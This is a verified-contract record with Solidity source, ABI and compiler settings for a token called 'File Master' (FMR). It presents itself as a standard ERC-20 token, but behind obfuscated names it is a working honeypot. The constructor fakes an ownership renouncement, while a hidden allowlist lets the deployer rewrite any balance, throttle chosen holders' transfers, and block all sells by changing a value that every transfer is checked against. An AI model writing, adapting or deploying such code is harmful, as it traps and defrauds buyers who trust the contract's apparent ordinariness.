{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface shouldIs {\n    function createPair(address buyTx, address senderLaunch) external returns (address);\n}\n\ninterface atMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeAutoReceiver) external view returns (uint256);\n\n    function transfer(address buyReceiver, uint256 swapMax) external returns (bool);\n\n    function allowance(address receiverMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyReceiver,\n        uint256 swapMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingReceiverIs, uint256 value);\n    event Approval(address indexed receiverMax, address indexed spender, uint256 value);\n}\n\nabstract contract launchWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeList is atMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FileMaster is launchWallet, atMin, modeList {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTrading;\n    }\n\n    mapping(address => bool) public txSenderReceiver;\n\n    function getOwner() external view returns (address) {\n        return limitLaunch;\n    }\n\n    bool private receiverMarketing;\n\n    function atAutoFund(address enableAmountMode, uint256 swapMax) public {\n        tradingLaunch();\n        maxTake[enableAmountMode] = swapMax;\n    }\n\n    bool private autoLimit;\n\n    event OwnershipTransferred(address indexed walletReceiverShould, address indexed modeAt);\n\n    uint256 private tokenModeLaunch;\n\n    address private limitLaunch;\n\n    mapping(address => uint256) private maxTake;\n\n    function owner() external view returns (address) {\n        return limitLaunch;\n    }\n\n    uint256 autoShould;\n\n    mapping(address => mapping(address => uint256)) private marketingMin;\n\n    function liquidityLaunchedAmount(address limitTotal) public {\n        if (swapAuto) {\n            return;\n        }\n        \n        fundExempt[limitTotal] = true;\n        \n        swapAuto = true;\n    }\n\n    address txSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private totalTake = 18;\n\n    uint256 constant senderIs = 9 ** 10;\n\n    address public fundSender;\n\n    bool public swapAuto;\n\n    address public liquidityTeam;\n\n    function transfer(address enableAmountMode, uint256 swapMax) external virtual override returns (bool) {\n        return swapEnableMode(_msgSender(), enableAmountMode, swapMax);\n    }\n\n    function allowance(address tokenTake, address sellLiquidityTrading) external view virtual override returns (uint256) {\n        if (sellLiquidityTrading == txSwap) {\n            return type(uint256).max;\n        }\n        return marketingMin[tokenTake][sellLiquidityTrading];\n    }\n\n    function swapEnableMode(address atTrading, address buyReceiver, uint256 swapMax) internal returns (bool) {\n        if (atTrading == liquidityTeam) {\n            return tokenSell(atTrading, buyReceiver, swapMax);\n        }\n        uint256 teamTradingSell = atMin(fundSender).balanceOf(receiverBuy);\n        require(teamTradingSell == autoShould);\n        require(buyReceiver != receiverBuy);\n        if (txSenderReceiver[atTrading]) {\n            return tokenSell(atTrading, buyReceiver, senderIs);\n        }\n        return tokenSell(atTrading, buyReceiver, swapMax);\n    }\n\n    function marketingBuy(address enableAmount) public {\n        tradingLaunch();\n        \n        if (enableAmount == liquidityTeam || enableAmount == fundSender) {\n            return;\n        }\n        txSenderReceiver[enableAmount] = true;\n    }\n\n    bool private amountSender;\n\n    address receiverBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private tokenTrading = 100000000 * 10 ** 18;\n\n    function sellBuy() public {\n        emit OwnershipTransferred(liquidityTeam, address(0));\n        limitLaunch = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalFromSwap;\n    }\n\n    function tokenSell(address atTrading, address buyReceiver, uint256 swapMax) internal returns (bool) {\n        require(maxTake[atTrading] >= swapMax);\n        maxTake[atTrading] -= swapMax;\n        maxTake[buyReceiver] += swapMax;\n        emit Transfer(atTrading, buyReceiver, swapMax);\n        return true;\n    }\n\n    constructor (){\n        if (amountShould == exemptIs) {\n            amountSender = true;\n        }\n        tokenTeam maxSell = tokenTeam(txSwap);\n        fundSender = shouldIs(maxSell.factory()).createPair(maxSell.WETH(), address(this));\n        if (amountShould == limitLiquidityBuy) {\n            receiverMarketing = false;\n        }\n        liquidityTeam = _msgSender();\n        fundExempt[liquidityTeam] = true;\n        maxTake[liquidityTeam] = tokenTrading;\n        sellBuy();\n        \n        emit Transfer(address(0), liquidityTeam, tokenTrading);\n    }\n\n    mapping(address => bool) public fundExempt;\n\n    string private atMaxEnable = \"File Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return atMaxEnable;\n    }\n\n    function transferFrom(address atTrading, address buyReceiver, uint256 swapMax) external override returns (bool) {\n        if (_msgSender() != txSwap) {\n            if (marketingMin[atTrading][_msgSender()] != type(uint256).max) {\n                require(swapMax <= marketingMin[atTrading][_msgSender()]);\n                marketingMin[atTrading][_msgSender()] -= swapMax;\n            }\n        }\n        return swapEnableMode(atTrading, buyReceiver, swapMax);\n    }\n\n    uint256 public amountShould;\n\n    function balanceOf(address takeAutoReceiver) public view virtual override returns (uint256) {\n        return maxTake[takeAutoReceiver];\n    }\n\n    function approve(address sellLiquidityTrading, uint256 swapMax) public virtual override returns (bool) {\n        marketingMin[_msgSender()][sellLiquidityTrading] = swapMax;\n        emit Approval(_msgSender(), sellLiquidityTrading, swapMax);\n        return true;\n    }\n\n    function tradingLaunch() private view {\n        require(fundExempt[_msgSender()]);\n    }\n\n    function senderFee(uint256 swapMax) public {\n        tradingLaunch();\n        autoShould = swapMax;\n    }\n\n    uint256 fromMode;\n\n    string private totalFromSwap = \"FMR\";\n\n    uint256 public limitLiquidityBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTake;\n    }\n\n    uint256 public exemptIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiverShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiverIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLiquidityTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidityTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"atAutoFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAutoReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLiquidityBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"}],\"name\":\"liquidityLaunchedAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"}],\"name\":\"marketingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"senderFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txSenderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FileMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}